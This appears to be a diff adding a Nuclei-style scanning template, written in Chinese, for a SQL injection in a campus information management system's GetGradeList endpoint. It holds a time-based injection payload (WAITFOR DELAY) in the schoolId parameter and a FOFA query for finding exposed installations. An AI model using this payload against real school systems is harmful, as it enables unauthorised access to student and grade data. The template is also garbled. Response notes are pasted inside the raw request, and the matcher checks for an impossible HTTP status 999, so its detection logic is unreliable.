@@ -1,0 +1,40 @@
+id: poc-yam7mzl0lwb36gkz
+info:
+  name: 校园信息管理系统-SQL注入-GetGradeList
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yam7mzl0lwb36gkz'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yam7mzl0lwb36gkz
+    fofa: body="jwkqunline.html"
+http:
+- raw:
+  - 'GET /PSE/GetGradeList?schoolId=1;WAITFOR%20DELAY%270:0:5%27%20-- HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Cookie: OPENID=; ASP.NET_SessionId=igu4dz25auwif5phwrwe0kih
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
